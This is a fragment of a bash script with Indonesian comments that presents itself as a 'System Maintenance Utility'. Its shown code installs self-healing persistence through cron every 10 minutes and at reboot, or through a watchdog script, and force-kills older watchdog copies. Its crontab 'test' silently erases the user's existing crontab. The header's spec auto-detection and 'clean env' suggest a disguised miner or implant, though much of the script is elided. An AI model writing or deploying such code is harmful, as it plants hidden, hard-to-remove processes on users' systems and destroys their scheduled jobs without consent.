#!/bin/bash
# System Maintenance Utility v12.0 FINAL
# Fix: auto-detect spec | auto-persistence (cron OR watchdog) | clean env
...
# ═══════════════════════════════════════════════════════════════════
# PERSISTENCE — Auto-pilih cron / watchdog
# ═══════════════════════════════════════════════════════════════════

has_cron_support() {
    # Test apakah user bisa pake crontab
    ...
    # Coba dummy install (test akses write)
    local test_output=$(echo "" | crontab - 2>&1)
    if echo "$test_output" | grep -q "not allowed\|not permitted\|Permission denied"; then
        return 1
    fi
    return 0
}
...
setup_persistence() {
    ...
    if has_cron_support; then
        ...
        # Install cron: cek tiap 10 menit + @reboot
...
WDEOF
    ...
    sed -i "s|__BASE_PATH__|$BASE|" "$WATCHDOG"
    sed -i "s|__HINT__|$2|" "$WATCHDOG"
    chmod +x "$WATCHDOG"

    # Kill watchdog lama, start 1
    pkill -9 -f "watchdog.sh" 2>/dev/null || true
    sleep 1
